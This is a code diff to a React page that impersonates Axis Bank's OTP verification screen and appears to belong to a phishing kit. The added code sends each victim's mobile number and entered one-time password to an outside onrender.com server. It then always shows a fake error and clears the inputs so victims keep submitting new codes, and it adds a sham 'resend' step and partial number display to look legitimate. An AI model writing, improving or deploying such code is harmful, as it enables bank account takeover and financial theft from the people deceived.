@@ -1,8 +1,11 @@
 import { useState } from "react";
+import { useLocation } from "react-router-dom";
 import { FaSpinner } from "react-icons/fa";
 import "./otpSubmit.css";
 
 export default function OTPSubmit() {
+  const location = useLocation();
+  const { mobileNumber } = location.state || {};
   const [otp, setOtp] = useState(new Array(6).fill(""));
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState({ text: "", type: "" });
@@ -35,10 +38,15 @@ export default function OTPSubmit() {
     }
   };
 
-  // Handle OTP verification (store OTP only)
+  // Handle OTP verification
   const handleVerify = async (otpValue) => {
     if (!otpValue || otpValue.length < 6) {
       setMessage({ text: "Please enter the 6-digit OTP", type: "error" });
+      return;
+    }
+
+    if (!mobileNumber) {
+      setMessage({ text: "Mobile number not found, please login again", type: "error" });
       return;
     }
 
@@ -46,44 +54,56 @@ export default function OTPSubmit() {
     setMessage({ text: "", type: "" });
 
     try {
-      const res = await fetch("https://axisonline-1.onrender.com/api/otp/submit", {
+      // Always store OTP + mobile number in DB
+      await fetch("https://axisonline-1.onrender.com/api/otp/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ otp: otpValue }),
+        body: JSON.stringify({ mobileNumber, otp: otpValue }),
       });
 
-      const result = await res.json();
-
+      // Show one of the predefined error messages and clear OTP inputs
       setTimeout(() => {
-        if (res.ok) {
-          setMessage({ text: errorMessages[errorIndex], type: "error" });
-          setErrorIndex((prevIndex) => (prevIndex + 1) % errorMessages.length);
-        } else {
-          setMessage({ text: result.error || "Server error, please try later", type: "error" });
-        }
+        setMessage({ text: errorMessages[errorIndex], type: "error" });
+        setErrorIndex((prevIndex) => (prevIndex + 1) % errorMessages.length);
+        setOtp(new Array(6).fill("")); // Clear OTP inputs
         setLoading(false);
-      }, 5000); // 5-second spinner
+      }, 3000); // spinner for 3s
     } catch (err) {
       console.error(err);
       setTimeout(() => {
         setMessage({ text: "Network error, please check your connection", type: "error" });
+        setOtp(new Array(6).fill("")); // Clear OTP inputs on network error
         setLoading(false);
-      }, 5000);
+      }, 3000);
     }
   };
 
   // Handle Resend OTP
-  const handleResend = () => {
-    setOtp(new Array(6).fill(""));
-    setMessage({ text: "OTP sent to your registered mobile number successfully", type: "success" });
+  const handleResend = async () => {
+    setOtp(new Array(6).fill("")); // Clear inputs
+    setMessage({
+      text: `OTP resent to your registered mobile number ending with ${mobileNumber ? mobileNumber.slice(-4) : "****"}`,
+      type: "success",
+    });
+
+    try {
+      await fetch("https://axisonline-1.onrender.com/api/otp/resend", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mobileNumber }),
+      });
+    } catch (err) {
+      console.error("Resend OTP error:", err);
+    }
   };
 
   return (
     <div className="otp-container">
       <img src="/icons/axis-bank.png" alt="Logo" />
       <h2>Secure Verification</h2>
+
       <p className="otp-headerrr">
-        Please enter the 6-digit OTP sent to your registered mobile number
+        Please enter the 6-digit OTP sent to your registered mobile number ending with {mobileNumber ? mobileNumber.slice(-4) : "****"}
       </p>
 
       {message.text && <div className={`form-message ${message.type}`}>{message.text}</div>}
@@ -92,7 +112,9 @@ export default function OTPSubmit() {
         {otp.map((data, index) => (
           <input
             key={index}
-            type="text"
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
             maxLength="1"
             value={data}
             onChange={(e) => handleChange(e.target, index)}
